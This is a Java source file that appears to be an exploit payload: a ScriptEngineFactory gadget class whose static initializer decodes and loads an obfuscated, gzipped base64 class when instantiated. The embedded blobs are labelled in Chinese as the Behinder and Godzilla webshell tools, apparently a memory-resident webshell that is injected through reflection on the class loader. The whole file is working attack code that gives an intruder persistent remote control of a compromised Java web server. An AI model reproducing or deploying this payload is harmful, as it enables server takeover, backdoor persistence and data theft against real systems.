package artsploit;

import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.*;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    static {
        Class aClass = null;
        try {
            // 冰蝎
//            aClass = defineClass("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");

            // 哥斯拉
            aClass = defineClass("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");
            aClass.newInstance();

        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public AwesomeScriptEngineFactory() {
        try {
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Class defineClass(String classByte) throws NoSuchMethodException, IOException, InvocationTargetException, IllegalAccessException {
        ClassLoader classLoader = (ClassLoader) Thread.currentThread().getContextClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
        defineClass.setAccessible(true);

        byte[] evalBytes = Base64.getDecoder().decode(classByte);

        java.io.ByteArrayInputStream byteInputStream = new java.io.ByteArrayInputStream(evalBytes);
        java.io.ByteArrayOutputStream byteOutputStream = new java.io.ByteArrayOutputStream();
        java.util.zip.GZIPInputStream gzipInputStream = new java.util.zip.GZIPInputStream(byteInputStream);

        byte[] buffer = new byte[1024];
        for (int i = -1; (i = gzipInputStream.read(buffer)) > 0; ) {
            byteOutputStream.write(buffer, 0, i);
        }
        byte[] bytes = byteOutputStream.toByteArray();

        return (Class<HttpServlet>) defineClass.invoke(classLoader, new Object[]{bytes, 0, bytes.length});
    }


    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
